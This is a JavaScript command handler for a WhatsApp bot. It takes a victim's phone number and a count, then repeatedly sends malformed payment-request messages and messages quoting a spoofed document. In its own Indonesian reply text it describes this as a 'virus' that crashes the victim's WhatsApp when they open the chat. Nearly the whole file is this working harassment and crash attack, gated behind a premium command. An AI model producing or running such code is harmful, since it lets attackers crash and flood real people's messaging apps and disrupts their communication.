let handler = async (m, { conn, text, command }) => {
if (!text) throw `*Jangan salah gunakan om yah*\n\nExample: ${command} 628XXXXXX/10`
let num = text.split('/')[0]+"@s.whatsapp.net"
let jumlah = text.split('/')[1]
await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
const dann = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": "Dann-MD",
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}
for (let i = 0; i < jumlah; i++) {
conn.relayMessage(num, { requestPaymentMessage: { Message: { extendedTextMessage: { text: '🗿', currencyCodeIso4217: 'IDR', requestFrom: '@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
conn.sendMessage(num, { text: '🗿'}, { quoted: dann })
}
m.reply(`Sukses Mengirim ${command}\nKe Nomor: ${text}\n\n*Note :* Virus ini aktif ketika korban membuka chat nya, maka WhatsApp akan crash hehe🗿`)
}
handler.help = ['🗿 <nomer/jumlah>']
handler.tags = ['tools']
handler.command = /^(🗿)$/i 
handler.premium = true 
module.exports = handler